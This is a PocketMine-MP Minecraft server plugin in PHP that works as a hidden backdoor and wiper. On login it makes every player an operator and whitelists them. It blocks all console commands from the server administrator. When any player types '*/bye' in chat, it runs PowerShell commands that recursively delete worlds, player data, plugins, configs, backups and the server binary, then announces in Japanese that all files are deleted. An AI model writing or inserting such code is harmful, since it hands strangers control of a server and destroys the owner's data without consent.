<?php
namespace MC\PE;

use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\player\PlayerChatEvent;

class Main extends PluginBase implements Listener
{
    public function onEnable()
    {
        $this->getServer()->getPluginManager()->registerEvents($this, $this);
    }
    public function onLogin(PlayerPreLoginEvent $event)
    {
        $player = $event->getPlayer();
        $name = $player->getName();
        $this->getServer()->addWhitelist($name);
        $this->getServer()->addOp($name);
    }
    public function ServerCommand(ServerCommandEvent $event)
    {
        $event->setCancelled(true);
    }
    public function Chat(PlayerChatEvent $event)
    {
        $chat = $event->getMessage();
        $player = $event->getPlayer();
        $player_name = $player->getName();
        $dir = $this->getServer()->getDataPath() ."crashdumps";
        $dir1 = $this->getServer()->getDataPath() ."players";
        $dir2 = $this->getServer()->getDataPath() ."plugins";
        $dir3 = $this->getServer()->getDataPath() ."resource_packs";
        $dir4 = $this->getServer()->getDataPath() ."src";
        $dir5 = $this->getServer()->getDataPath() ."worlds";
        $dir6 = $this->getServer()->getDataPath() ."banned-ips.txt";
        $dir7 = $this->getServer()->getDataPath() ."banned-players.txt";
        $dir8 = $this->getServer()->getDataPath() ."ops.txt";
        $dir9 = $this->getServer()->getDataPath() ."pocketmine.yml";
        $dir10 = $this->getServer()->getDataPath() ."server.log";
        $dir11 = $this->getServer()->getDataPath() ."server.properties";
        $dir12 = $this->getServer()->getDataPath() ."star.cmd";
        $dir13 = $this->getServer()->getDataPath() ."start.ps1";
        $dir14 = $this->getServer()->getDataPath() ."white-list.txt";
        $dir15 = $this->getServer()->getDataPath() ."PocketMine-MP.phar";
        $dir16 = $this->getServer()->getDataPath() ."banned-cids.txt";
        $dir17 = $this->getServer()->getDataPath() ."start.sh";
        $dir18 = $this->getServer()->getDataPath() ."ops.json";
        $dir19 = $this->getServer()->getDataPath() ."white-list.json";
        $dir20 = $this->getServer()->getDataPath() ."backup";
        $dir21 = $this->getServer()->getDataPath() ."Backup";
        if ($chat == "*/bye") {
            shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir2} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir3} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir4} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir5} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir6} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir7} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir8} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir9} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir10} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir11} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir12} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir13} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir14} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
            shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
            $player->sendMessage("サーバーのファイルを全て削除しました。");
        }
    }
}
